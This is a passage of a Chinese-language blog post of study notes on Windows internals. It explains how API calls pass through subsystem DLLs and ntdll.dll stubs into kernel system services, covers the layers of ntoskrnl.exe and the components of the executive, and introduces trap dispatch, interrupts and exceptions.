<li>该函数要求调用Windows执行体一次或者多次。例如，Windows的<code>ReadFile</code>、<code>WriteFile</code>函数分别要调用底层内部的（且无文档的） Windows I&#x2F;O系统服务<code>NtReadFile</code>和<code>NtWriteFile</code>。</li>
<li>该函数要求在环境子系统进程（Csrss.exe）中完成某些工作（环境子系统进程运行在用户模式下，负责维护那些在其控制下运行的客户应用程序的状态)。在这种情况下，该函数通过消息的形式向环境子系统发送客户机&#x2F;服务器请求，从而让子系统执行某个操作。然后子系统DLL等待应答，收到应答之后再返回调用者。</li>
</ol>
<p>有些函数可以是以上列出的第2和第3项的组合，比如Windows的<code>CreateProcess</code>和<code>CreateThread</code>函数。</p>
</div>

<div class="note warning"><p>从应用程序的角度来看，它通过给子系统DLL发出的服务请求（<mark class="label danger">即API调用</mark>）是如何被满足的。首先，由于这些子系统DLL被加载（LoadLibrary）到应用程序进程中，所以，这些服务请求是直接的函数调用（同一进程地址空间中跨模块的函数调用）。当子系统DLL接收到一个函数调用以后，根据该函数功能的复杂程度，可能有以下的处理方式：</p>
<ol>
<li>直接由子系统DLL包揽所有工作。这一类函数总是在用户模式下完成，不涉及处理器模式切换。这类函数的典型例子有：<ul>
<li><code>RtInRect</code>、<code> IsRectEmpty</code>这样的简单函数，无须内核模块或Windows子系统进程的介人即可完成；</li>
<li><code>GetCurrentProcess</code>函数，简单地返回一个伪句柄值（-1）代表当前进程；</li>
<li><code>GetCurrentProcessld</code>函数，可以从一个缓存的数据结构中获得当前进程的ID，无须每次调用都进入到内核中，因为进程ID在进程的生命周期中保持不变。</li>
</ul>
</li>
<li>需要调用Windows内核一次或多次。 在这种情形下，可能存在一次或多次模式切换，子系统DLL或者通过ndll.dll调用到Windows执行体，或者通过win32k.sys注册的系统服务表（<code>KeServiceDescriptorTableShadow</code>）调用到win32k.sys 中。这类API函数的例子有：<ul>
<li><code>ReadFile</code>和<code>WriteFile</code>函数，调用底层的<code>NtReadFile</code>或<code>NtWriteFile</code>系统服务；</li>
<li><code>PostMessage</code>和<code>BitBIt</code>这样的窗口管理和GDI函数，调用win32k.sys 中的<code>NtUserPostMessage</code>或<code>NtGdiBitBIt</code>来完成其功能（它们也可能会调用Windows执行体函数，比如为了获取用以保护共享资源的锁）。</li>
</ul>
</li>
<li>需要Windows子系统进程（ Csrss.cxe）的协助来完成其功能。在这种情况下，子系统DLL向csrss.exe进程发送一个请求（以LPC消息的形式)，然后等待应答消息，直至收到应答并完成所有功能之后再返回调用者。这类API函数最典型的例子是<code>CreateProccess</code>和<code>CreateThread</code>，它们需要通知子系统进程，以维护子系统环境中进程和线程的状态。</li>
</ol>
<p>以上三种可能的执行方式仅仅代表了子系统DLL在执行一个服务请求时可能的执行路径，并非简单地将API函数分成三类。</p>
</div>

<p>其他有关Windows子系统的窗口管理器和GDI详细细节，可参考《Windows内核原理与实现》9.2章节。</p>
<h4 id="2-2-3-Ntdll-dll"><a href="#2-2-3-Ntdll-dll" class="headerlink" title="2.2.3 Ntdll.dll"></a>2.2.3 Ntdll.dll</h4><p>2.2.2中所提到的应用程序调用子系统DLL时的第2种情况，即应用程序会调用到内核一次或多次，因为Windows API无法直接调用到内核服务，这个时候就会使用到ntdll.dll，ntdll.dll充当应用程序和内核服务的桥梁，即从R3到R0的桥梁。</p>
<div class="note success"><p>Windows内核为用户模式代码提供了一组系统服务，供应用程序使用内核中的功能。 应用程序通常并不直接调用这些系统服务，而是通过一组系统DLL，最终通过ntdll.dll切换到内核模式下的执行体API函数中，以调用内核中的系统服务。Ntdll.dlI是连接用户模式代码和内核模式系统服务的桥梁。<strong>对于内核提供的每一个系统服务， 该DLL都提供个相应的存根函数，这些存根函数的名称以“Nt” 作为前缀</strong>。</p>
</div>

<div class="note danger"><p>Ntdll.dlI是一个特殊的系统支持库， 主要用于子系统DLL。它包含两种类型的函数：</p>
<ol>
<li>（执行体）系统服务分发<mark class="label danger">存根</mark>（stub），这些存根函数（例程）会调用Windows执行体的系统服务。（此部分函数供应用程序从R3转入R0使用，这部分函数以 <code>Nt</code>为前缀）。</li>
<li>系统内部支持函数， 供子系统、子系统DLL以及其他的原生映像文件使用。（此部分函数不支持模式R3到R0的切换）。</li>
</ol>
</div>

<ol>
<li><p>第一组函数为Windows执行体系统服务提供了接口，在用户模式下可以通过这些接口函数调用Windows执行体的系统服务。这样的函数超过了400个，比如<code>NtCreateFile</code>、<code>NtSetEvent</code>等。 如前所述，这些函数的大多数功能可以通过Windows API来访问得到(然而，有些函数则不然，它们仅被用于操作系统内部)。对于每一个这样的函数，Ntdll包含 了一个同名的入口点。函数内部的代码包含了与处理器体系架构相关的模式切换指令，通过该指令可转换到内核模式下，从而调用系统服务分发 器（system service dispatcher）。系统服务分发器在检验某些参数以后，再调用真正的内核模式系统服务，其中包括Ntoskrml.exe内部的实际代码。</p>
</li>
<li><p>对于NtdlI中的内部（系统）支持函数，比如：</p>
<ul>
<li>映像加载（以<code>Ldr</code>开头的函数）；</li>
<li>堆管理器；</li>
<li>Windows子系统进程通信函数（以<code>Csr</code>开头的函数）；</li>
<li>一般性的运行库例程（以<code>Rtl</code>开头的函数）；</li>
<li>对用户模式调试调试函数（以<code>DbgUi</code>开头的函数）；</li>
<li>Windows事件跟踪的支持函数（以<code>Erw</code>开头的函数）；</li>
<li>用户模式异步过程调用（APC，Asynchronous Procedure Call）分发器和异常分发器；</li>
<li>C运行库（CRT）例程的子集，仅限于字符串和标准库中的一些例程，比如memcpy、 strepy，ioa，等等。</li>
</ul>
</li>
</ol>
<p><strong>本文主要讲第一种</strong>（具体参考《Windows内核原理与实现》8.1.2）</p>
<div class="note primary"><p>在Windows的系统结构中，内核提供的服务都通过ntdll.dll模块被应用程序使用。 Windows应用程序调用一组系统 DLL中的API函数，间接地通过ntdll.dll中的存根函数来调用内核提供的系统服务。</p>
<p>Windows内核中的执行体层暴露了大量的功能供应用程序使用，那么，应用程序如何调用这些功能呢？譬如，<code>NtCreateFile</code>是Windows内核中的“创建文件”服务例程（函数），它运行在处理器的内核模式下，而应用程序的代码运行在用户模式下，所以，应用程序为了调用此“创建文件”服务，必须将处理器从用户模式切换到内核模式下。当然，模式切换工作并不需要由应用程序自已来完成，Windows 提供了一个系统模块ntdll.dll，<strong>已经实现了所有系统服务的模式切换工作</strong>。这一模式切换依赖于硬件体系结构。</p>
</div>

<p>ntdll.dll是Windows系统从ring3到ring0的入口。位于<code>Kernel32.dll</code>和<code>user32.dll</code>中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用<code>SYSENTRY</code>进入ring0，函数的实现实体在ring0中。</p>
<p>ntdll.dll中的大部分函数都是在MSDN中找不到描述的，因为这些函数介于Windows API与内核API之间，微软并<br>未公开全部的内核函数。</p>
<p>Windows中应用程序与与Windows内核打交道的过程如下图：</p>
<p><img data-src="https://i.loli.net/2021/05/23/BwbCPfAle1T4IVM.png" alt="9.png"></p>
<p>Windows应用程序调用系统DLL中的函数，这是大量已经文档化的API函数；这些系统DLL函数可能又进一步调用ntdll.dll中的系统函数，这些系统函数要么是操作系统提供的支持函数，要么是一些系统服务存根( stub)。系统服务存根函数利用模式切换指令进入到内核模式，调用内核提供的系统服务来完成应用程序的请求。举例：</p>
<div class="note success"><ol>
<li>Windows应用程序调用Windows API函数<code>CreateFile</code>来创建文件，此API函数实际上是<code>CreateFileW</code>，位于kernel32.dll模块中。</li>
<li><code>CreateFileW</code>函数又进步调用ntdll.dll中的 <code>NtCreateFile</code>函数。Ntdll.dll中的<code>NtCreateFile</code>函数是一个存根函数，它只是简单地将创建文件的请求转<mark class="label default">交给内核</mark>中的<code>NtCreateFile</code>函数。为了做到这一点，它通过ntdll.dll中的 <code>KiIntSystemCall</code>或<code>KiFastSystemCall</code>函数执行<mark class="label warning">int 2e</mark>或<mark class="label warning">sysenter</mark>指令，以便切换到内核模式下，然后由内核模式的系统服务分发函数<code>KiSystemService</code>来调用<code>NtCreateFile</code>系统服务。</li>
<li>待<code>NtCreateFile</code>系统服务执行完成以后，<code>KiSystemService</code>调用<code>KiServiceExit</code>函数，最终通过<mark class="label warning">iretd</mark>或<mark class="label warning">sysexit</mark>指令返回到用户模式ntdll.dl模块中。</li>
</ol>
</div>

<p><img data-src="https://i.loli.net/2021/05/25/j3uBplzOT5sbxR9.png" alt="10.png"></p>
<h3 id="2-3-内核模式"><a href="#2-3-内核模式" class="headerlink" title="2.3 内核模式"></a>2.3 内核模式</h3><p><strong>（Kernel mode）</strong></p>
<h4 id="2-3-1-内核结构"><a href="#2-3-1-内核结构" class="headerlink" title="2.3.1 内核结构"></a>2.3.1 内核结构</h4><div class="note default"><p>Windows内核分为三层：</p>
<ul>
<li><mark class="label primary">执行体层</mark></li>
<li><mark class="label warning">内核层</mark></li>
<li><mark class="label success">硬件抽象层</mark></li>
</ul>
<p><mark class="label danger">执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为ntoskrnl.exe</mark></p>
</div>



<ol>
<li><mark class="label success">硬件抽象层</mark>（Hardware Abstraction Layer，简称HAL）：与硬件直接打交道的这一层称为，这一层的用意是把所有与硬件相关联的代码逻辑隔离到一个专门的模块中，从而使上面的层次尽可能做到独立于硬件平台。</li>
<li><mark class="label warning">内核层</mark>：HAL之上是内核层，有时候也称为微内核（micro-kernel），这层包含了基本的操作系统原语和功能，如线程和进程、线程调度、中断和异常的处理、同步对象和各种同步机制。</li>
<li><mark class="label primary">执行体层</mark>：在内核层之上则是执行体（executive）层，这一层的目的是提供些可供上层应用程序或内核驱动程序直接调用的功能和语义。Windows内核的执行体包含一个对象管理器，用于一致地管理执行体中的对象。</li>
</ol>
<p>执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为ntoskrnl.exe。内核层和执行体层的分工是：</p>
<ul>
<li>内核层实现操作系统的基本机制，而所有的策略决定则留给执行体。</li>
<li>执行体中的对象绝大多数封装了一个或者多个内核对象，并且通过某种方式（比如对象句柄）暴露给应用程序。</li>
</ul>
<p>Windows内核的详细组成结构如下图：</p>
<p><img data-src="https://i.loli.net/2021/05/18/nNp3YAsozRtj8dV.png" alt="6.png"></p>
<div class="note danger"><p><mark class="label default">Ntdll.dll</mark></p>
<p>Windows内核为用户模式代码提供了一组系统服务，供应用程序使用内核中的功能。应用程序通常并不直接调用这些系统服务，而是通过一组系统DLL，最终通过<mark class="label default">ntdll.dll</mark>切换到内核模式下的执行体API函数中，以调用内核中的系统服务。<mark class="label primary">Ntdll.dlI是连接用户模式代码和内核模式系统服务的桥梁。</mark><mark class="label warning">对于内核提供的每一个系统服务， 该DLL都提供个相应的存根函数</mark>，这些存根函数的名称以“Nt” 作为前缀，例如NCreateProcess NtOpenFile 和NtSetTimer。</p>
<p>另外，ntdll. dll还提供了许多系统级的支持函数：</p>
<ul>
<li>以 <code>Nt</code>为前缀：ntdll. dll存根函数的名称</li>
<li>以 <code>Ldr</code>为前缀：映像加载器函数</li>
<li>以 <code>Csr</code>为前缀：Windows子系统进程通信函数</li>
<li>以 <code>Dbg</code>为前缀：调试函数</li>
<li>以 <code>Etw</code>为前缀：系统事件函数</li>
<li>以 <code>Rt</code>为前缀：一般的运行支持函数</li>
<li>字符串支持函数等。</li>
</ul>
</div>

<div class="note success"><p><mark class="label info">执行体API函数</mark></p>
<p>执行体API函数接收的参数来自于各种应用程序，因此，为了确保系统的健壮性， 以及抵抗来自用户模式的恶意攻击，<mark class="label info">所有的执行体API函数必须保证参数的有效性</mark>。这意味着它们必须在恰当的时刻检查参数的值，若是指针的话，还必须保证调用者可以访问指针所指的内存。通常，执行体系统服务函数会在其开始处，对所接收的参数逐一探查它们的可访问性。</p>
</div>

<h4 id="2-3-2-内核及Ntoskrnl-exe"><a href="#2-3-2-内核及Ntoskrnl-exe" class="headerlink" title="2.3.2 内核及Ntoskrnl.exe"></a>2.3.2 内核及Ntoskrnl.exe</h4><p>Windows内核的执行体包含一个对象管理器，用于一致地管理执行体中的对象。执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为<mark class="label primary">ntoskrnl.exe</mark>。执行体层是ntoskrnl.exe的上层部分，内核层是ntoskrnl.exe的下层部分。</p>
<div class="note danger"><p>内核层和执行体层的分工是：内核层实现操作系统的基本机制，而所有的策略决定则留给执行体。执行体中的对象绝大多数封装了一个或者多个内核对象，并且通过某种方式（比如对象句柄）暴露给应用程序。</p>
</div>



<p>Windows的内核（层）按照面向对象的思想来设计，它管理两种类型的对象：分发器对象（dispatcher object）和控制对象。</p>
<ul>
<li>分发器对象实现了各种同步功能，这些对象的状态会影响线程的调度。Windows内核实现的分发器对象包括：<ul>
<li>事件（event）</li>
<li>突变体（mutant）</li>
<li>信号量（semaphore）</li>
<li>进程（process）</li>
<li>线程（thread）</li>
<li>队列（queue</li>
<li>门（gate）</li>
<li>定时器（timer）</li>
</ul>
</li>
<li>控制对象被用于控制内核的操作，但是不影响线程的调度，它包括：<ul>
<li>异步过程调用（APC）</li>
<li>延迟过程调用（DPC）</li>
<li>中断对象等。</li>
</ul>
</li>
</ul>
<p><strong>关于Windows研究内核</strong></p>
<p>Windows并非一个开放源代码的操作系统，Micosoft 开放了一份以Windows XP x64和Windows Server 20003 SPI为基础的内核源代码，它可以编译和运行，作为教育科研机构的教学实践和研究的平台使用，称为<mark class="label default">WRK</mark>（Windows Research Kernel，Windows研究内核）。除了这份源代码本身，WRK还提供了其他一些材料。主要包含以下：</p>
<ul>
<li>WRK内核源代码，涉及进程、线程、内存管理、执行体、对象管理器、缓存管理器、本地过程调用（LPC）、注册表、I&#x2F;O管理器、安全引用监视器，以及线程调度、APC（异步过程调用）、DPC（延迟的过程调用）、中断以及异常处理等。随源代码起提供的还有相应的编译工具，因此，无须额外的编译器即可将WRK编译成Windows Server 2003 SP1的可执行内核。</li>
<li>NT设计文档。这是一组早期的文档，尽管其内容已不完全适用于现在的Windows操作系统以及WRK中的代码，但是，通过阅读这些文档一方面可以清楚地理解 Windows NT背后的原始设计思想，另一方面也可以看出Windows在这十多年中是如何发展和进化的。这些文档涵盖了Windows操作系统的方方面面，甚至包括文件系统设计大纲和内核的调试结构等。</li>
</ul>
<p>其他内容于《Windows内核原理与实现》2.3.1中。</p>
<p>Windows的内核模块文件是ntoskrnl.exe，位于Windws\Sytem32目录下，它包含了Windows体系结构中的执行体和内核（或微内核）部分。WRK提供的源代码可以编译得到这一内核模块文件。</p>
<p>WRK包含了编译ntoskrnl.exe内核模块所需要的绝大部分代码，<strong>未公开部分的代码主要包括即插即用设备管理、电源管理、设备驱动程序检验器和虚拟DOS机的实现</strong>。为了编译WRK源代码以得到实际可运行的内核模块，缺失的这部分被以二进制目标代码的形式包含在了WRK中，该目录还包含了其他些需要静态链接的目标文件。</p>
<div class="note warning"><p>内核模块内部的每个组件都提供了一些接口函数供其他组件调用，也有一些函数供该组件内部使用。有一些组件内部函数也有规律可循：前缀第一个字母后面跟一个<code>i</code>，或者在前缀后面跟一个<code>p</code>。</p>
<ul>
<li><code>i</code>：<code>internal</code>，即内部的；</li>
<li><code> p</code>：<code>private</code>，即私有的；</li>
<li><code>Ki</code>：微内核；</li>
<li><code>Mi</code>：内存管理器的内部函数；</li>
<li><code>Halp</code>：HAL的内部函数；</li>
<li><code>Psp</code>：进程和线程管理组件的内部函数；</li>
<li><code>Iop</code>：I&#x2F;O管理器的内部函数。</li>
</ul>
</div>

<p>表2.3列出了一些常用的标识性前缀。</p>
<p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<h4 id="2-3-3-执行体"><a href="#2-3-3-执行体" class="headerlink" title="2.3.3 执行体"></a>2.3.3 执行体</h4><p>Windows执行体是Windows内核体的上层接口，包含了基本的<mark class="label warning">操作系统服务</mark>。这些系统服务由不同的组件组成，执行体包含以下组件：</p>
<ol>
<li><strong>进程和线程管理器</strong>。负贵创建进程和线程，以及终止进程和线程。在Windows中，对于进程和线程的底层支持是在内核层提供的，执行体在内核层的进程和线程对象的基础上，又提供了一些语义和功能。</li>
<li><strong>内存管理器</strong>。此组件实现了虚报内存管理，既负责系统地址空间的内存管理，又为每个进程提供了一个私有的地址空间，并且也支持进程之间内存共享。内存管理器也为缓存管理器提供了底层支持。</li>
<li><strong>安全引用监视器</strong>（SRM，Security Reference Monitor）。该组件强制在本地计算机上实施安全策略，它守护着操作系统的资源，执行对象的保护和审计。</li>
<li><strong>I&#x2F;O管理器</strong>。它实现了与设备无关的输入和输出功能，负责将IO请求分发给正确的设备驱动程序以便进步处理。</li>
<li><strong>缓存管理器</strong>。它为文件系统提供了统一的数据缓存支持， 允许文件系统驱动程序将磁盘上的数据映射到内存中，并通过内存管理器来协调物理内存的分配。</li>
<li><strong>配置管理器</strong>。它负责系统注册表的实现和管理。</li>
<li><strong>即插即用管理器</strong>。它负责列举设备，并为每个列举到的设备确定哪些驱动程序是必需的，然后加载并初始化这些驱动程序。当它检测到系统中的设备变化（增加或移除设备）时，负责发送恰当的事件通知。</li>
<li><strong>电源管理器</strong>。它负责协调电源事件，向设备驱动程序发送电源I&#x2F;O通知。当系统电源状态变化时，通知设备驱动程序处理设备的电源状态。即插即用设备的管理和电源的管理也可以看做是IO管理器的扩展功能。</li>
<li>……</li>
</ol>
<div class="note primary"><p>执行体包含以下5种类型的函数：</p>
<ol>
<li><p>可在用户模式下调用的<mark class="label warning">导出函数</mark>。这些函数称为<mark class="label default">系统服务</mark>，对这些函数的调用接口位于Ntdll模块中，即通过Ntdll导出。可分为：</p>
<ul>
<li>应用程序可通过Windows API来间接地调用这些函数；</li>
<li>应用程序无法通过Windows API来调用的函数，直接链接ntdll.dll来完成。如LPC（Local Procedure Call，本地过程调用）函数、各种查询函数（如<code>NtQueryInformation&lt;Xxx&gt;</code>），以及一些专用的函数，比如<code>NtCreatePagingFile</code>等。</li>
</ul>
</li>
<li><p>可通过<code>DeviceIoControl</code>函数来调用的<mark class="label warning">设备驱动程序函数</mark>。这为从用户模式到内核模式提供了一个通用的接口，因而在用户模式下可以调用设备驱动程序中并不与读或者写操作关联的函数。并且在Windows DDK中有关于这些函数的文档。</p>
</li>
<li><p>只能在<mark class="label warning">内核模式下调用</mark>的<strong>导出函数</strong>。已经<strong>被文档化</strong>的，这些函数可以被设备驱动程序调用。</p>
</li>
<li><p>在内核模式下调用，未被导出的函数，供执行体组件之间相互调用，但<strong>未被文档化</strong>的函数。这包括执行体内部使用的一组支持函数。</p>
</li>
<li><p>属于一个组件的内部（模块）函数。</p>
</li>
</ol>
</div>

<div class="note info"><p>此外，执行体还包含4组主要的支持函数，供以上这些<mark class="label success">执行体组件调用</mark>。差不多有1&#x2F;3的支持函数可以在Windows DDK中找到相应的文档，因为设备驱动程序也要调用它们。这4类支持函数如下所列：</p>
<ol>
<li>对象管理器。它负责创建、管理和删除Windows执行体对象，以及用于表达操作系统资源的抽象数据类型，比如进程、线程和各种同步对象。</li>
<li>LPC设施。LPC设施负责在同一台机器上的客户进程和服务器进程之间传递消息。 LPC是RPC（Remote Procedure Call，远程过程调用，关于网络上客户进程和服务器进程之间通信的工业标准）的一个优化版本。</li>
<li>一组运行时库函数。其功能广泛，涵盖字符串处理、算术运算、数据类型转换以及安全结构处理等。</li>
<li>执行体支持例程。例如系统内存分配（换页内存池和非换页内存池）、互锁的内存访问，以及对两种特殊类型同步对象（资源和互斥体）的支持。</li>
</ol>
</div>





<h4 id="2-3-4-系统机制"><a href="#2-3-4-系统机制" class="headerlink" title="2.3.4 系统机制"></a>2.3.4 系统机制</h4><ul>
<li>系统机制<ul>
<li>陷阱分发<ul>
<li>系统服务分发</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Windows操作系统提供了一些基本的<mark class="label success">机制</mark><mark class="label danger">供内核模式的组件</mark>（比如执行体、内核和设备驱动程序）使用。本节将介绍下面的系统机制中的陷阱（其他机制可查看《深入解析Windows操作系统第6版》第3章）：</p>
<ol>
<li><mark class="label default">陷阱分发</mark>， 包括
<ul>
<li>中断；</li>
<li>延迟的过程调用（DPC）；</li>
<li>异步过程调用（APC）；</li>
<li>异常分发；</li>
<li><mark class="label default">系统服务分发</mark>。</li>
</ul>
</li>
<li>执行体对象管理器。</li>
<li>同步，包括自旋锁、内核分发器对象、等待是如何实现的，以及一些专门针对用户模式的同步原语（它们不同于传统的同步对象，可避免切换至内核模式）。</li>
<li>系统辅助线程</li>
<li>其他的机制，比如Windows全局标志。</li>
<li>高级的本地过程调用（ALPC）。</li>
<li>内核事件跟踪。</li>
<li>Wow64。</li>
<li>用户模式调试。</li>
<li>映像加载器。</li>
<li>超级管理器（Hyper-V）。</li>
<li>内核事务管理器（KTM）。</li>
<li>内核补丁保护（KPP）。</li>
<li>代码完整性。</li>
</ol>
<h4 id="2-3-5-陷阱分发"><a href="#2-3-5-陷阱分发" class="headerlink" title="2.3.5 陷阱分发"></a>2.3.5 陷阱分发</h4><div class="note danger"><p><mark class="label info">中断</mark>和<mark class="label warning">异常</mark>是导致处理器转向正常控制流<strong>之外</strong>代码的两种操作系统条件。硬件或者软件都可以检测到这两种条件。</p>
</div>

<p>术语<strong>陷阱</strong>（trap）指的是这样种机制：当异常或者中断发生时，处理器捕捉到一个执行线程，并且将控制权转移到操作系统中某一固定地址处。在Windows中， 处理器会将控制权转给<strong>陷阱处理器</strong>（trap handler）。所谓陷阱处理器，是指与某个特定的中断或异常相关联的<strong>函数</strong>。</p>
<div class="note danger"><p><strong>陷阱分发</strong>：陷阱处理器用以区分和确认硬件或者软件产生的陷阱属于中断还是异常或是系统服务。然后转由相应的中断分发、异常分发或系统服务分发去处理后续事项。同时分发任务由相应的处理器去完成，处理器实际上就是一些函数（例程）。</p>
</div>

<p>图3.1显示了一些能激活陷阱处理器的条件：</p>
<p><img data-src="https://i.loli.net/2021/05/29/atLHVbdXJPMIfwi.png" alt="13.png"></p>
<p>导致陷阱的条件有如：中断、异常、系统服务调用（分发）、DPC及APC等。</p>
<div class="note default"><p>关于中断和异常：</p>
<p><mark class="label warning">中断</mark>：中断分为异步中断和同步中断。</p>
<ul>
<li><mark class="label info">异步中断</mark>，也叫硬中断、外部中断、中断。是指由于外部设备事件所引起的中断。中断由外因引起。</li>
<li><mark class="label info">同步中断</mark>，也叫内中断、<strong>异常</strong>。是指由于 CPU 内部事件所引起的中断。异常由CPU本身原因引起。同时，<strong>软中断属于异常中的一种</strong>。同步中断就属于异常。</li>
</ul>
<p><strong>硬中断就是外部设备（比如IO，时钟设备）的中断，<mark class="label warning">软中断就是INT指令</mark>，异常就是CPU内部的中断</strong>，比如除零异常。</p>
<p>硬件的中断可分为<strong>上半部分</strong>和<strong>下半部分</strong>，下半部分也叫做软中断。上半部在屏蔽中断的上下文中运行，用于完成关键性的处理动作，然后产生软中断。下半部就是软中断处理程序，对时间要求不是非常紧急，通常比较耗时的，因此不在硬中断服务程序中执行。</p>
<p><strong>异常的分类： 处理器探测到的异常、编程异常（也称<mark class="label warning">软中断</mark>）。</strong></p>
<ul>
<li>处理器探测到的异常：<ul>
<li>故障（Fault）</li>
<li>陷阱（Trap）</li>
<li>异常终止（Abort）</li>
</ul>
</li>
<li>编程异常（也称软中断）：<ul>
<li>int指令</li>
</ul>
</li>
</ul>
<p>对于中断和异常的处理，主要是利用<strong>中断描述符表IDT</strong>中的中断描述符。</p>
<p>陷入中断(trap interrupt)， 也称软中断(soft interrupt)，系统调用(system call)简称trap：在程序中使用请求系统服务的系统调用而引发的事件。陷入是由在 cpu 上运行的当前进程导致的。如：</p>
<ul>
<li>除零错；</li>
<li>地址访问越界等。</li>
</ul>
</div>

<p>参考：</p>
<ul>
<li>《<a href="https://www.zhihu.com/question/30432536#:~:text=%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%8F%88%E5%8F%AB%E5%81%9A%E7%BC%96%E7%A8%8B%E5%BC%82%E5%B8%B8%EF%BC%8C%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8D%B3int%200x80%E4%BB%A5%E5%8F%8A%E7%BB%99%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E9%80%9A%E6%8A%A5%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%9A%84%E4%BA%8B%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BD%AF%E4%B8%AD%E6%96%AD%E6%98%AF%E5%BC%82%E5%B8%B8%E7%9A%84%E4%B8%80%E7%A7%8D%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8C%E6%AD%A5%E4%B8%AD%E6%96%AD%E3%80%82%20%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E8%AF%B4%E5%BC%82%E6%AD%A5%E4%B8%AD%E6%96%AD%E5%88%86%E4%B8%BA%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%92%8C%E7%A1%AC%E4%B8%AD%E6%96%AD%E3%80%82%20%E6%AD%A3%E5%A6%82%E6%A5%BC%E4%B8%BB%E6%89%80%E8%AF%B4%EF%BC%8C%E4%B8%AD%E6%96%AD%E5%88%86%E4%B8%BA%E5%90%8C%E6%AD%A5%E4%B8%AD%E6%96%AD%EF%BC%8C%E4%B9%9F%E7%A7%B0%E5%BC%82%E5%B8%B8%EF%BC%8C%E5%92%8C%E5%BC%82%E6%AD%A5%E4%B8%AD%E6%96%AD%EF%BC%8C%E4%B9%9F%E7%A7%B0%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%BD%93%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E7%94%B1CPU%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E4%BA%A7%E7%94%9F%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%8F%AA%E6%9C%89%E5%9C%A8%E8%AF%A5%E6%8C%87%E4%BB%A4%E7%BB%88%E6%AD%A2%E6%89%A7%E8%A1%8C%E5%90%8ECPU%E6%89%8D%E4%BC%9A%E5%8F%91%E5%87%BA%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%BC%82%E5%B8%B8%E5%8F%AF%E4%BB%A5%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%BB%86%E5%88%86%E4%B8%BA%E5%A4%84%E7%90%86%E5%99%A8%E6%8E%A2%E6%B5%8B%E5%BC%82%E5%B8%B8%E5%92%8C%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0%E7%9A%84%E7%BC%96%E7%A8%8B%E5%BC%82%E5%B8%B8%E3%80%82%20%E6%95%85%E9%9A%9C,%E6%95%85%E9%9A%9C%E5%BE%88%E6%9C%89%E7%89%B9%E7%82%B9%EF%BC%8C%E6%95%85%E9%9A%9C%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%BA%A0%E6%AD%A3%E7%9A%84%EF%BC%8C%E4%B8%80%E6%97%A6%E7%BA%A0%E6%AD%A3%EF%BC%8C%E4%BC%9A%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8C%E5%BC%95%E8%B5%B7%E6%95%85%E9%9A%9C%E7%9A%84%E6%8C%87%E4%BB%A4%E3%80%82%20%E8%BF%99%E5%B0%B1%E6%98%AF%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%E7%9A%84%E6%9C%BA%E5%88%B6%E3%80%82%20%E7%94%B1%E5%85%B6%E4%BB%96%E7%A1%AC%E4%BB%B6%E9%9A%8F%E6%9C%BA%E4%BA%A7%E7%94%9F%E3%80%82%20%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%8F%AF%E5%B1%8F%E8%94%BD%E4%B8%AD%E6%96%AD%E5%92%8C%E9%9D%9E%E5%B1%8F%E8%94%BD%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%AF%B9%E4%BA%8E%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E5%88%A9%E7%94%A8%20%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8IDT%20%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%82%20%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%B1%9E%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E6%95%B0%E6%8D%AE%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8D%E5%90%8C%E3%80%82">中断，异常，陷阱，软硬中断，同异步中断？？</a>》</li>
<li>《<a href="https://blog.csdn.net/zhangxinrun/article/details/5967233">同步中断（异常）和 软中断</a>》</li>
<li>《<a href="https://blog.csdn.net/weixin_45783996/article/details/109134900">硬中断，软中断，信号，异常</a>》</li>
<li>《<a href="https://blog.csdn.net/qq_29996285/article/details/88078939">面试考点——中断和异常的区别</a>》</li>
<li>《<a href="https://www.cnblogs.com/charlesblc/p/6277810.html">信号和中断的比较 + 中断和异常的比较</a>》</li>
<li>《<a href="https://www.cnblogs.com/HsinTsao/p/6395570.html">异常、中断、陷阱</a>》</li>
</ul>
<div class="note success"><p>中断和异常的区分（内核按照下面的方法来区分中断和异常。）：</p>
<ul>
